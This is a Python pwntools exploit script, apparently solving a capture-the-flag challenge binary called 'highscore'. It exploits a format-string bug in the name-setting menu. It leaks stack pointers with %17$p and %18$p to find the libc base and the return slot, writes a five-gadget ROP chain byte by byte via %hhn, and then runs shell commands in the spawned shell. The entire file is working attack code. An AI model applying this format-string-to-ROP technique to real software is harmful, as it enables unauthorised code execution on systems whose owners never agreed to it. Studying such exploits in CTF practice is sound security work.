from pwn import *
import sys
context.log_level='info'

def set_name(p, payload):
    p.recvuntil(b'>> ')
    p.sendline(b'1')
    p.recvuntil(b'Enter new name: ')
    p.sendline(payload)
    p.recvuntil(b'Player: ')
    return p.recvline().strip()

def write_byte(p, addr, val):
    width = val if val != 0 else 256
    fmt = f"%{width}c%12$hhn".encode()
    payload = fmt.ljust(16, b'A') + p64(addr)
    set_name(p, payload)

def write_qword(p, addr, val):
    for i, b in enumerate(p64(val)):
        write_byte(p, addr + i, b)

p = process('./highscore')

out17 = set_name(p, b"%17$p")
l17 = int(out17.decode(), 16)
out18 = set_name(p, b"%18$p")
l18 = int(out18.decode(), 16)

libc_base = l17 - 0x29ca8
ret_slot = l18 - 0xf8

print(f"L17: {hex(l17)}")
print(f"L18: {hex(l18)}")
print(f"Libc base: {hex(libc_base)}")
print(f"Ret slot: {hex(ret_slot)}")

chain = [
    libc_base + 0x2846b,
    libc_base + 0x2a145,
    libc_base + 0x1a7ea4,
    libc_base + 0x53110,
    libc_base + 0x42340
]

for i, q in enumerate(chain):
    print(f"Writing {hex(q)} to {hex(ret_slot + 8*i)}")
    write_qword(p, ret_slot + 8*i, q)

p.recvuntil(b'>> ')
p.sendline(b'4')
p.sendline(b'echo PWNED; /usr/bin/id')
# Use a loop to read output to avoid timing issues
try:
    print(p.recvrepeat(1).decode('latin1'))
except EOFError:
    print("Process died")
p.close()
